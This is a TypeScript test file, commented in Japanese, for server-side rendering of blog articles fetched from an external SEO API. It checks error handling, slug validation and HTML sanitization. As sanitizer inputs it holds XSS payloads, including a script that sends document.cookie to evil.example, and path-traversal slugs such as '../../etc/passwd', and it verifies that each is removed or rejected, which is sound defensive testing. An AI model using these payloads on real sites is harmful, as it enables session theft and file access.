import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';

/**
 * /blog をサーバー側で描く、その中身の検査。
 *
 * これまで /blog は向こうの script 札1本だけで、こちらのHTMLには
 * 記事の文字が1文字も入っていなかった（実測 146文字）。
 * 検索の評価は文字の載っているページに付くので、書いた記事は
 * すべて larubot.tokyo の資産になっていた。
 *
 * ここで確かめること。
 *   ・よその本文を、そのままHTMLとして出していないか
 *   ・向こうが遅い・変な形を返した日に、こちらのページが落ちないか
 *   ・記事が0件のとき、中身の無いページを検索側へ出していないか
 */

const read = (path: string) => fs.readFileSync(new URL(`../${path}`, import.meta.url), 'utf8');

process.env.NEXT_PUBLIC_LARUBOT_PUBLIC_ID = '501609c7-23e3-4d03-be1f-f9699dd2842e';
process.env.LARUBOT_API_URL = 'https://larubot.example';

const { listArticles, getArticle, isValidSlug } = await import('../lib/laruseo-articles');

const real = globalThis.fetch;
/** 次の1回の fetch をこの応答に差し替える。URLも覚えておく。 */
function stub(handler: (url: string) => { status?: number; body?: unknown } | Promise<never>) {
  const seen: string[] = [];
  globalThis.fetch = (async (input: RequestInfo | URL) => {
    const url = String(input);
    seen.push(url);
    const r = await handler(url);
    return {
      ok: (r.status ?? 200) < 400,
      status: r.status ?? 200,
      json: async () => r.body,
    } as Response;
  }) as typeof fetch;
  return seen;
}
test.afterEach(() => { globalThis.fetch = real; });

/* ── 取ってくる ────────────────────────────────── */

test('一覧: 認証不要の公開口を、設置IDつきで叩く', async () => {
  const seen = stub(() => ({ body: { success: true, articles: [], has_more: false } }));
  const list = await listArticles({ limit: 24 });
  assert.equal(seen.length, 1);
  assert.match(seen[0], /^https:\/\/larubot\.example\/api\/seo\/public\/501609c7-23e3-4d03-be1f-f9699dd2842e\/articles\?limit=24&page=1$/);
  // 0件は「取れなかった」ではない。呼ぶ側が文言を書き分けられるように区別する。
  assert.deepEqual(list, { articles: [], hasMore: false, ok: true, reason: null });
});

test('向こうが落ちている日に、こちらのページを道連れにしない', async () => {
  stub(() => Promise.reject(new Error('timeout')));
  const list = await listArticles();
  assert.equal(list.ok, false, '例外を上へ投げるとページ全体が500になる');
  assert.equal(list.reason, 'unreachable');
  assert.deepEqual(list.articles, []);

  stub(() => ({ status: 502, body: null }));
  assert.equal((await listArticles()).ok, false);
  assert.equal(await getArticle('x'), null);
});

test('返ってきた形を信じない: 欠けた行・壊れた行は落とす', async () => {
  stub(() => ({
    body: {
      articles: [
        { slug: 'ok-1', title: '正しい行', meta_description: '説明', published_date: '2026-09-01T00:00:00Z' },
        { slug: '../../etc/passwd', title: '経路を抜ける' },
        { slug: 'no-title', title: '   ' },
        { title: 'slugが無い' },
        'これは行ですらない',
        { slug: 'ok-2', title: 'サムネが http', thumbnail_url: 'http://example.com/a.png' },
      ],
      has_more: true,
    },
  }));
  const { articles, hasMore } = await listArticles();
  assert.deepEqual(articles.map(a => a.slug), ['ok-1', 'ok-2']);
  assert.equal(hasMore, true);
  // http の絵は出さない。鍵付きのページに混ぜると、鍵が外れる。
  assert.equal(articles[1].thumbnailUrl, null);
  assert.equal(articles[0].publishedAt, '2026-09-01T00:00:00.000Z');
});

test('日付が読めないとき、いまの時刻で埋めない', async () => {
  stub(() => ({ body: { articles: [{ slug: 'a', title: 'T', published_date: 'あとで' }] } }));
  const { articles } = await listArticles();
  assert.equal(articles[0].publishedAt, null, 'いまの時刻を入れると、古い記事が新着に化ける');
});

test('slug は経路を抜けられない形だけ通す', () => {
  for (const ok of ['hello-world', 'a', 'a.b-c_d', 'A1']) assert.ok(isValidSlug(ok), ok);
  for (const ng of ['../x', 'a/b', '..', '.hidden', '', 'a b', 'あ', 'a?b=1', 'x'.repeat(201)]) {
    assert.ok(!isValidSlug(ng), ng);
  }
});

/* ── 本文 ─────────────────────────────────────── */

const article = (content: string, extra: Record<string, unknown> = {}) => ({
  body: { success: true, article: { slug: 'post-1', title: '題', content, content_format: 'html', ...extra } },
});

test('本文は、よそのHTMLとして必ず除菌してから出す', async () => {
  stub(() => article(
    '<h2>見出し</h2><p>本文</p>'
    + '<script>fetch("https://evil.example?c="+document.cookie)</script>'
    + '<img src="https://ok.example/a.png" alt="絵" onerror="alert(1)">'
    + '<img src="http://plain.example/b.png" alt="素のhttp">'
    + '<a href="javascript:alert(1)">押すと動く</a>'
    + '<a href="https://ok.example" target="_blank">よそ</a>'
    + '<iframe src="https://evil.example"></iframe>',
  ));
  const a = await getArticle('post-1');
  assert.ok(a);
  const html = a.html;

  assert.match(html, /<h2>見出し<\/h2>/);
  assert.match(html, /<p>本文<\/p>/);

  // 動くものを1つも残さない
  assert.doesNotMatch(html, /<script/i);
  assert.doesNotMatch(html, /<iframe/i);
  assert.doesNotMatch(html, /onerror/i);
  assert.doesNotMatch(html, /javascript:/i);
  assert.doesNotMatch(html, /document\.cookie/, 'script の中身まで消す');

  // https の絵だけ残し、http は落とす
  assert.match(html, /<img src="https:\/\/ok\.example\/a\.png" alt="絵" loading="lazy" decoding="async">/);
  assert.doesNotMatch(html, /plain\.example/);
  assert.match(html, /alt="素のhttp"/, '絵は落としても、そこに何かがあったことは残す');

  // 別タブへ出すリンクには、必ず rel を付ける
  assert.match(html, /<a href="https:\/\/ok\.example" target="_blank" rel="noopener noreferrer">/);
});

test('html 以外の形式で来たら、HTMLとして解釈しない', async () => {
  stub(() => article('# 見出し <b>太字</b>', { content_format: 'markdown' }));
  const a = await getArticle('post-1');
  assert.ok(a);
  assert.match(a.html, /&lt;b&gt;/, '素の文字として出す');
  assert.doesNotMatch(a.html, /<b>/);
});

test('本文が空の記事は、ページを作らない', async () => {
  stub(() => article(''));
  assert.equal(await getArticle('post-1'), null);
  stub(() => ({ body: { success: false } }));
  assert.equal(await getArticle('post-1'), null);
});

test('経路を抜ける slug では、そもそも取りに行かない', async () => {
  const seen = stub(() => ({ body: {} }));
  assert.equal(await getArticle('../../admin'), null);
  assert.equal(seen.length, 0);
});

/* ── ページ側 ─────────────────────────────────── */

test('/blog は向こうの script 札をやめ、サーバー側で記事を取る', () => {
  const page = read('app/blog/page.tsx');
  assert.match(page, /await listArticles\(/);
  assert.doesNotMatch(page, /LaruSeoBlog|blog\.js/, 'ブラウザで描くと、こちらのHTMLに文字が載らない');
  assert.ok(!fs.existsSync(new URL('../components/LaruSeoBlog.tsx', import.meta.url)));
});

test('記事が0件のあいだは、検索側へ出さない', () => {
  const page = read('app/blog/page.tsx');
  assert.match(page, /robots: empty \? \{ index: false, follow: true \} : undefined/);
  assert.match(page, /記事はまだありません/);
  assert.match(page, /reason === 'unreachable'/, '0件と、取れなかったを書き分ける');
  assert.match(page, /記事をいま読み込めませんでした/);
  // 待っても増えないときに「しばらく経ってから」と書かない。
  assert.doesNotMatch(page, /!ok/);

  const sitemap = read('app/sitemap.ts');
  assert.match(sitemap, /articles\.length/, '0件のブログを sitemap に載せない');
  assert.match(sitemap, /\$\{base\}\/blog\/\$\{a\.slug\}/);
});

test('記事ページは、除菌済みの文字列だけを描く', () => {
  const page = read('app/blog/[slug]/page.tsx');
  // dangerouslySetInnerHTML に入るのは article.html（getArticle が除菌したもの）だけ。
  const injected = [...page.matchAll(/dangerouslySetInnerHTML=\{\{ __html: ([^}]+) \}\}/g)].map(m => m[1].trim());
  assert.ok(injected.length > 0);
  for (const expr of injected) {
    assert.ok(
      expr === 'article.html' || expr.startsWith('jsonForScript('),
      `生のHTMLを直接描いている: ${expr}`,
    );
  }
  assert.match(page, /canonical: url/);
  assert.match(page, /'@type': 'BlogPosting'/);
  assert.match(page, /notFound\(\)/, '無い記事で空のページを出さない');
});
